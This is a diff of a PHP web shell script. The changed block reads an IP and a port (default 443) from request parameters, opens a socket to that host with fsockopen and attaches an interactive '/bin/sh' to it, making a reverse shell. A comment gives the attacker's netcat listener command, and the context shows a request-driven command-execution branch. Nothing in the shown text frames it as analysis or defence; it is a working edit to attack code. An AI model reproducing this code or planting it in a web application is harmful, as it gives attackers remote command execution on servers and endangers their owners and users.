@@ -50,16 +50,14 @@ if (isset($_REQUEST[$cmd])) {
    die();
 }
 
-if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
-   $ip = $_REQUEST[$ip];
-
+if (isset($_REQUEST[$ip])) {
    // default port 443
    $port = isset($_REQUEST[$port])
       ? $_REQUEST[$port]
       : '443';
 
    // nc -nlvp $port
-   $sock    = fsockopen($ip, $port);
+   $sock    = fsockopen($_REQUEST[$ip], $port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
 
    // notify on execution failure
